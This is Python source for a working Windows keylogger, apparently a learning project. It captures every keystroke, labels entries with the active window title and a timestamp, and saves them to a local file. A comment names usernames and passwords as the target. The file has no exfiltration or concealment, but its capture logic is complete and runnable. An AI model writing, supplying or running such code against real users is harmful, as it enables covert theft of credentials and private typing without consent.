from datetime import datetime  # For generating timestamps
from pynput.keyboard import Key, Listener # type: ignore # For listening to keypresses/keyboard_events
import os # For file handling and path operations
import win32gui # type: ignore # For getting the active window title

count = 0
keys = []
current_window = None  
recording = False  # Flag to track whether recording is active



def on_press(key):
    global current_window
    
    
    active_window = get_active_window_title()

    # Check if the active window has changed
    if active_window != current_window:
        current_window = active_window # Update the current window title
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S") # Get the current timestamp
        keys.append(f'\n[Switched to: {current_window} at {timestamp}]\n') # Log the window change
    #print(f"Active Window: {active_window}")


    # Convert the key to a string and remove any single quotes (e.g., 'a' becomes a)
    k = str(key).replace("'", "")
    print("{0} prassed".format(k))
    if k == "Key.space": # If space key pressed, add a next line for better readability
        k = "\n"

     # Add the processed key to the 'keys' list (storing pressed keys)
    keys.append(k)

    # if list length reaches 50 AND the last key pressed is a newline,
    # OR if the 'Escape' key is pressed, then save the data to a file.
    if keys.__len__() >= 50 and k == "\n" or k == "Key.esc":
        # Timestamp to record when the block is saved
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Log the start of a new block of saved data with a timestamp
        writeToFile(f'\n Saving New Block at {timestamp}\n')
        writeToFile(keys) #  keys to the file
        keys.clear()



# usernames and passwords
# active window and tab titles
def get_active_window_title():
     # [GetForegroundWindow -> gets handle (an int) then ] pass to GetWindowText -> gets title
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())


def writeToFile(keys):
    # Ensure the file exists or create it if it doesn't
    if not os.path.exists("logged.txt"):
        with open("logged.txt", "w") as f:
            pass  # Create an empty file

    # Open the file in append mode and write the keys to the file
    with open("logged.txt", "a") as f:
        for key in keys:
            f.write(key)
        #f.write("\n")


def on_release(key):#checks if the key released is the escape key and if it is, it returns False to stop the listener.
    if key == Key.esc:
        return False


'''
def start_recording():
    #Start recording keys
    global recording
    recording = True
    print("Recording started!")

def stop_recording():
    #Stop recording keys
    global recording
    recording = False
    print("Recording stopped!")


# hotkey listener for specific combinations
hotkey_listener = GlobalHotKeys({
    '<ctrl>+<shift>+l': start_recording,
    '<ctrl>+<shift>+s': stop_recording
})

# Start the hotkey listener in a separate thread

'''

# Keyboard listener that triggers the `on_press` function when a key is pressed
# and the `on_release` function when a key is released.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() # Blocking call that keeps the program running that waits for the listener to stop.        
